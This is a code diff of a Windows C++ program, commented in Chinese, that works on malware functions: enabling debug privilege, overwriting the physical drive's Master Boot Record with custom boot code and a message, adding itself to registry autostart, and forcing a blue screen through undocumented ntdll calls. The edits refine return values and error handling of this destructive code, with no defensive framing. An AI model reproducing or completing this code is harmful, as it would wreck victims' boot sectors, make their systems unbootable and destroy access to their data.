@@ -2,13 +2,8 @@
 
 
 using namespace std;
-//自定义MBR
 
-
-
-
-
-void GetPrivileges()
+bool GetPrivileges()
 {
 	//定义一个PLUID
 	HANDLE hProcess;
@@ -21,10 +16,13 @@ void GetPrivileges()
 	tp.PrivilegeCount = 1;
 	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
 	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-	AdjustTokenPrivileges(hTokenHandle, FALSE, &tp, sizeof(tp), NULL, NULL);
+	bool retn;
+	retn=AdjustTokenPrivileges(hTokenHandle, FALSE, &tp, sizeof(tp), NULL, NULL)==TRUE;
 	CloseHandle(hTokenHandle);
 	CloseHandle(hProcess);
-
+	if (GetLastError() != ERROR_SUCCESS)
+		return false;
+	return retn;
 }
 
 //写MBR
@@ -35,10 +33,8 @@ bool WritePhydriveMBR(unsigned int id,string msgstr)
 	static char pMBR[512] = { 0xB8,0x11,0x00,0xCD,0x10,0xBD,0x18,0x7C,0xB9,/*字符位数*/0x00,0x00,0xB8,0x01,0x13,0xBB,0x0C,0x00,0xBA,0x00,0x00,0xCD,0x10,0xEB,0xFE };
 	#pragma warning(pop)
 	static bool isfirstuse=true;
-	if (isfirstuse)//
-	{
-		//初始化MBR
-		
+	if (isfirstuse)
+	{//初始化MBR
 		//改MBR中字符位数
 		pMBR[9] = static_cast<char>(msgstr.size());
 		//加循环逻辑锁————已弃用！！！仅Win9x下有效果！！！
@@ -49,6 +45,7 @@ bool WritePhydriveMBR(unsigned int id,string msgstr)
 		pMBR[511] = static_cast<char>(0xAA);
 		//把提示字符写入MBR
 		strcpy_s(reinterpret_cast<char *>(pMBR + 24), 512, msgstr.c_str());
+		isfirstuse = false;
 	}
 
 	//计算硬盘文件名称
@@ -100,7 +97,7 @@ void RegAutoStart()
 		//3、判断注册表项是否已经存在
 		TCHAR strDir[MAX_PATH] = {};
 		DWORD nLength = MAX_PATH;
-		long result = RegGetValue(hKey, nullptr, _T("yhy3daigamestudio"), RRF_RT_REG_SZ, 0, strDir, &nLength);
+		long result = RegGetValue(hKey, nullptr, _T("3daisoft"), RRF_RT_REG_SZ, 0, strDir, &nLength);
 		//4、已经存在
 		if (result != ERROR_SUCCESS || _tcscmp(strExeFullDir, strDir) != 0)
 		{
@@ -113,7 +110,7 @@ void RegAutoStart()
 }
 
 //蓝屏函数
-void MakeBlueScreen(unsigned int errid)
+bool MakeBlueScreen(unsigned int errid)
 {
 	HMODULE ntdll = LoadLibrary(_T("ntdll.dll"));
 	if (ntdll != NULL)
@@ -125,6 +122,8 @@ void MakeBlueScreen(unsigned int errid)
 		long unsigned int HDErr;
 		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjPriv)(0x13, true, false, &ErrKill);
 		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))ZwRaiseHardErr)(errid, 0, 0, 0, 6, &HDErr);
+		FreeLibrary(ntdll);
+		return false;
 	}
 
 }
